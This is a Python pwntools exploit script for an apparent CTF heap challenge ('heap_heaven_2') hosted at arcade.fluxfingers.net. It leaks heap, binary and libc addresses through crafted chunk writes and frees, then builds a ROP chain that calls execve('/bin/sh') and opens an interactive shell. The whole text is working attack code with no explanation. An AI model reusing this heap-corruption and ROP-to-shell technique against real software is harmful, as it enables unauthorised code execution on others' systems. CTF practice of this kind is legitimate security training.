from pwn import *

#r = process('./heap_heaven_2')
r = remote('arcade.fluxfingers.net', 1809)

def write(offset, size, data):
	r.sendafter('exit\n', '1\n')
	r.sendafter('How much do you want to write?\n', str(size) + '\n')
	r.sendafter('At which offset?\n', str(offset) + '\n')
	r.send(data.ljust(size, '\x00'))

def free(offset):
	r.sendafter('exit\n', '3\n')
	r.sendafter('At which offset do you want to free?\n', str(offset) + '\n')

def leak(offset):
	r.sendafter('exit\n', '4\n')
	r.sendafter('At which offset do you want to leak?\n', str(offset) + '\n')
	return r.recvuntil('\nPlease select your action:').split('\nPlease select your action:')[0]

#leak all the addresses

payload = p64(0x0) + p64(0x501) + '\x00'*0x4f8 + p64(0x21) + '\x00'*0x18 + p64(0x21)

write(0, len(payload), payload)
free(0x10)
heap = u64(leak(0x10).ljust(8, '\x00')) - 0x40

log.success('Heap @ ' + hex(heap))

write(0, 0x8, p64(heap + 0x30))

text_section = u64(leak(0x0).ljust(8, '\x00')) - 0x1670

log.success('.text @ ' + hex(text_section))

write(0, 0x8, p64(text_section + 0x3f80))

libc = u64(leak(0x0).ljust(8, '\x00')) - 0x72a40

log.success('Libc @ ' + hex(libc))

write(0, 0x8, p64(text_section + 0x4048 + 0x1))

mmapped = u64(leak(0x0).ljust(8, '\x00')) << 8

log.success('Mmapped @ ' + hex(mmapped))

write(0, 0x30, p64(0x0) + p64(0x21) + p64(0x0)*3 + p64(0x21))
free(0x10)

rop_chain = ''
rop_chain += p64(libc + 0x3ad30) #pop rax ; ret
rop_chain += p64(0x3b)
rop_chain += p64(libc + 0x23be3) #pop rdi ; ret
rop_chain += p64(libc + 0x184519) #/bin/sh
rop_chain += p64(libc + 0x2458e) #pop rsi ; ret
rop_chain += p64(0x0)
rop_chain += p64(libc + 0x109055) #pop rdx ; ret
rop_chain += p64(0x0)
rop_chain += p64(libc + 0xb7849) #syscall ; ret

write(0, 0x100, p64(0x0)*2 + p64(libc + 0x109054) + p64(libc + 0x4d850) + rop_chain)

print hex((heap + 0x10) - mmapped)

pause()

free((heap + 0x10) - mmapped)

r.interactive()
